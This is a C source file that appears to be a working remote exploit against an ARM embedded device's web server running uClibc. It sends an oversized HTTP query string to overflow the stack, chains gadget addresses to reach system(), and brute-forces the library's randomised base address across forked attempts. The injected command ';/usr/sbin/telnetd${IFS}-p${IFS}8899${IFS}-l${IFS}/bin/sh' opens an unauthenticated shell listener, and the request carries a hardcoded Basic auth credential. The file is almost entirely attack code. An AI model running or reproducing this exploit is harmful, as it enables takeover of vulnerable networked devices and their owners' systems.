#pragma pack (1)
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <time.h>
#include <fcntl.h>
struct head{
	char zero[69948];
	unsigned int _r4;
	unsigned int _r5;
	unsigned int _r6;
	unsigned int _r7;
	unsigned int _r8;
	unsigned int _r9;
	unsigned int _r10;
	unsigned int _r11;
	unsigned int _pc;
	unsigned int __r3;
	unsigned int __r4;
	unsigned int __r5;
	unsigned int __pc;
	char cmd[64];
};
int geturl(const char *host, unsigned short port, unsigned int base_addr){
	int j, i, ret, sockfd;
	char *buff = malloc(sizeof(struct head));
	struct head *HEAD = (struct head *)buff;
	memset(HEAD->zero, 'A', sizeof(HEAD->zero));
	HEAD->_r4 = (0x00045523 - 0xc) + base_addr;	/*0xFFFEE000*/
	if(((HEAD->_r4 >> 0) & 0xFF) == 0 || ((HEAD->_r4 >> 8) & 0xFF) == 0 || ((HEAD->_r4 >> 16) & 0xFF) == 0 || ((HEAD->_r4 >> 24) & 0xFF) == 0 || \
        ((HEAD->_r4 >> 0) & 0xFF) == 0x0D || ((HEAD->_r4 >> 8) & 0xFF) == 0x0D || ((HEAD->_r4 >> 16) & 0xFF) == 0x0D || ((HEAD->_r4 >> 24) & 0xFF) == 0x0D || \
        ((HEAD->_r4 >> 0) & 0xFF) == 0x0A || ((HEAD->_r4 >> 8) & 0xFF) == 0x0A || ((HEAD->_r4 >> 16) & 0xFF) == 0x0A || ((HEAD->_r4 >> 24) & 0xFF) == 0x0A)
        goto _ERR;
	HEAD->_r5 = 0x41414141;	/*AAAA*/
	HEAD->_r6 = 0x41414141;	/*AAAA*/
	HEAD->_r7 = 0x41414141;	/*AAAA*/
	HEAD->_r8 = 0x41414141;	/*AAAA*/
	HEAD->_r9 = 0x41414141;	/*AAAA*/
	HEAD->_r10 = 0x41414141;	/*AAAA*/
	HEAD->_r11 = 0x41414141;	/*AAAA*/
	HEAD->_pc = 0x0003FD40 + base_addr;    /*libuClibc-0.9.33.2.so
                                            0003FD40     LDR     R3, [R4,#0xC]  = 0xFFFEE000
                                            0003FD44     RSB     R3, R3, R2     R2-->Stack
                                            0003FD48     ADD     R0, R0, R3  +  R0-->&HEAD->_pc;HEAD->cmd
                                            0003FD4C     LDMFD   SP!, {R3-R5,PC}PC-->system         */
    if(((HEAD->_pc >> 0) & 0xFF) == 0 || ((HEAD->_pc >> 8) & 0xFF) == 0 || ((HEAD->_pc >> 16) & 0xFF) == 0 || ((HEAD->_pc >> 24) & 0xFF) == 0 || \
        ((HEAD->_pc >> 0) & 0xFF) == 0x0D || ((HEAD->_pc >> 8) & 0xFF) == 0x0D || ((HEAD->_pc >> 16) & 0xFF) == 0x0D || ((HEAD->_pc >> 24) & 0xFF) == 0x0D || \
        ((HEAD->_pc >> 0) & 0xFF) == 0x0A || ((HEAD->_pc >> 8) & 0xFF) == 0x0A || ((HEAD->_pc >> 16) & 0xFF) == 0x0A || ((HEAD->_pc >> 24) & 0xFF) == 0x0A)
        goto _ERR;
	HEAD->__r3 = 0x41414141;	/*AAAA*/
	HEAD->__r4 = 0x41414141;	/*AAAA*/
	HEAD->__r5 = 0x41414141;	/*AAAA*/
	HEAD->__pc = 0x00052A0C + base_addr;   /*libuClibc-0.9.33.2.so->system*/
    if(((HEAD->__pc >> 0) & 0xFF) == 0 || ((HEAD->__pc >> 8) & 0xFF) == 0 || ((HEAD->__pc >> 16) & 0xFF) == 0 || ((HEAD->__pc >> 24) & 0xFF) == 0 || \
        ((HEAD->__pc >> 0) & 0xFF) == 0x0D || ((HEAD->__pc >> 8) & 0xFF) == 0x0D || ((HEAD->__pc >> 16) & 0xFF) == 0x0D || ((HEAD->__pc >> 24) & 0xFF) == 0x0D || \
        ((HEAD->__pc >> 0) & 0xFF) == 0x0A || ((HEAD->__pc >> 8) & 0xFF) == 0x0A || ((HEAD->__pc >> 16) & 0xFF) == 0x0A || ((HEAD->__pc >> 24) & 0xFF) == 0x0A)
        goto _ERR;
    printf("base addr:0x%08x\n", base_addr);
    //printf("_r4:0x%08x\t_pc:0x%08x\t__pc:0x%08x\n", HEAD->_r4, HEAD->_pc, HEAD->__pc);
	strncpy(HEAD->cmd, ";/usr/sbin/telnetd${IFS}-p${IFS}8899${IFS}-l${IFS}/bin/sh", sizeof(HEAD->cmd));
	struct sockaddr_in servaddr;
	bzero(&servaddr, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(port);
	servaddr.sin_addr.s_addr = inet_addr(host);
	if((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
		return -1;
	if(connect(sockfd, (const struct sockaddr *)&servaddr, sizeof (struct sockaddr_in)) == -1){
        close(sockfd);
		return -1;
    }
	struct timeval tv;
	tv.tv_sec = 10;
	tv.tv_usec = 0;	
	ret = setsockopt(sockfd,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
	ret = setsockopt(sockfd,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
	ret = write(sockfd, "GET /?", 6);
	ret = write(sockfd, buff, strlen(buff));
	ret = write(sockfd, " HTTP/1.1\r\n", 11);
	ret = write(sockfd, "Host: ", 6);
	ret = write(sockfd, host, strlen(host));
	ret = write(sockfd, "\r\nConnection: Keep-Alive\r\n", 26);
	ret = write(sockfd, "Authorization: Basic cmVwb3J0OjhKZzBTUjhLNTA=\r\n\r\n", 49);  /*report:8Jg0SR8K50*/
	ret = read(sockfd, buff, sizeof(struct head));
    if(ret > 0){
        *(buff + ret) = '\0';
        printf("%s", buff);
    }
	close(sockfd);
_ERR:    
    free(buff);
	return 0;
}
int main(int argc, char *argv[]){
	if(argc < 4){
        printf("%s: [Host] [Port] [IntervalTime]\n", argv[0]);
		return 0;
    }
	unsigned int base_addr = 0xb6910000;
	pid_t pid;
	int ret;
	unsigned int ran;
	int fd = open("/dev/random", O_RDONLY | O_CLOEXEC);
	while(fd != -1){
		ret = read(fd, &ran, 1);
		pid = fork();
		if(pid > 0){
			sleep(atoi(argv[3]));
			while(waitpid(0, &pid, WNOHANG) > 0);
		}
		else if(pid == -1){
            close(fd);
			break;
        }
		else{
			geturl(argv[1], atoi(argv[2]), base_addr + ((ran & 0xFF) << 12));
			break;
		}
	}
	return 0;
}
